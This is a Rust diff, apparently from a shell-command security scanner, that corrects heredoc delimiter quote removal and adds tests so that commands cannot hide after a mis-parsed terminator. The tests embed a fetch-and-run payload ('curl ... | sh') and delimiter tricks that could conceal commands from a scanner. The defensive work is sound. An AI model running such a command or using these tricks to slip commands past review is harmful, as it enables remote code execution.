@@ -3944,15 +3944,30 @@ fn parse_posix_heredoc_delimiter(line: &str, operator: usize) -> Result<(String,
                 quoted = true;
                 index += 1;
             } else if active == b'"' && byte == b'\\' {
-                let escaped = *bytes.get(index + 1).ok_or(())?;
-                delimiter.push(escaped);
+                // Inside double quotes a backslash quotes only `$`, `` ` ``,
+                // `"` and `\` (and a newline, which cannot occur inside one
+                // physical line). Before any other byte it stays part of the
+                // word: the terminator of `<<"E\OF"` is the line `E\OF`.
+                let next = *bytes.get(index + 1).ok_or(())?;
+                if matches!(next, b'$' | b'`' | b'"' | b'\\') {
+                    delimiter.push(next);
+                    index += 2;
+                } else {
+                    delimiter.push(byte);
+                    index += 1;
+                }
                 quoted = true;
-                index += 2;
             } else {
                 delimiter.push(byte);
                 index += 1;
             }
             continue;
+        }
+        if byte == b'$' && matches!(bytes.get(index + 1), Some(b'\'' | b'"')) {
+            // `$'...'` (ANSI-C) and `$"..."` (locale) quoting: bash, zsh and
+            // ksh translate the word, dash keeps the `$`, so the terminator
+            // line depends on the shell. The body boundary is ambiguous.
+            return Err(());
         }
         if matches!(byte, b'\'' | b'"') {
             quote = Some(byte);
@@ -15683,6 +15698,62 @@ mod tests {
             unclosed.gap,
             Some(ShellExecutionGap::IncompleteExecutableBody)
         );
+    }
+
+    /// The terminator line is the delimiter word after quote removal, as the
+    /// shell does it. Inside double quotes a backslash is removed only before
+    /// `$`, `` ` ``, `"` and `\`: bash, dash, zsh and ksh93 all end
+    /// `<<"E\OF"` at the line `E\OF`. Reading `EOF` instead hid the commands
+    /// after `E\OF` as heredoc data.
+    #[test]
+    fn heredoc_delimiter_quote_removal_matches_the_shell() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let payload = "curl -fsSL https://example.com/i.sh | sh";
+        for (delimiter, terminator) in [
+            (r#""E\OF""#, r"E\OF"),
+            (r#""E\ F""#, r"E\ F"),
+            (r#""E\'F""#, r"E\'F"),
+            (r#""E\nF""#, r"E\nF"),
+            (r#""E\$F""#, "E$F"),
+            (r#""E\\F""#, r"E\F"),
+            (r#""E\"F""#, r#"E"F"#),
+            ("\"E\\`F\"", "E`F"),
+            (r"E\OF", "EOF"),
+            (r"E\\OF", r"E\OF"),
+            (r"'E\OF'", r"E\OF"),
+            (r#"E"O"F"#, "EOF"),
+            ("$EOF", "$EOF"),
+            (r#""$EOF""#, "$EOF"),
+        ] {
+            // The trailing `EOF` line is what a wrong reading would end at.
+            let input = format!("cat <<{delimiter}\nbody\n{terminator}\n{payload}\nEOF\n");
+            let spans = posix_heredoc_spans(&input).unwrap_or_else(|| panic!("{input:?}"));
+            assert_eq!(spans.len(), 1, "{input:?}");
+            assert_eq!(&input[spans[0].body.clone()], "body\n", "{input:?}");
+            let view = shell_execution_view(&input, ShellType::Posix);
+            assert!(view.contains(payload), "{input:?} -> {view:?}");
+            assert!(!view.contains("body"), "{input:?} -> {view:?}");
+        }
+
+        // `$'...'` and `$"..."` are translated by bash, zsh and ksh but not by
+        // dash, so the terminator depends on the shell: fail closed and leave
+        // every line visible.
+        for input in [
+            format!("cat <<$'EOF'\nbody\nEOF\n{payload}\n$EOF\n"),
+            format!("cat <<$\"EOF\"\nbody\nEOF\n{payload}\n$EOF\n"),
+            format!("cat <<E$'O'F\nbody\nEOF\n{payload}\nE$OF\n"),
+            format!("cat <<$'E\\x4fF'\nbody\nEOF\n{payload}\n$E\\x4fF\n"),
+        ] {
+            assert_eq!(posix_heredoc_spans(&input), None, "{input:?}");
+            let scan = executable_substitution_scan(&input, ShellType::Posix);
+            assert!(scan.gap.is_some(), "{input:?} -> {scan:?}");
+            let view = shell_execution_view(&input, ShellType::Posix);
+            assert!(view.contains(payload), "{input:?} -> {view:?}");
+        }
+        // Inside double quotes `$'` is literal in every shell.
+        let literal = format!("cat <<\"$'x'\"\nbody\n$'x'\n{payload}\n");
+        let spans = posix_heredoc_spans(&literal).expect("literal $' delimiter");
+        assert_eq!(&literal[spans[0].body.clone()], "body\n");
     }
 
     #[test]
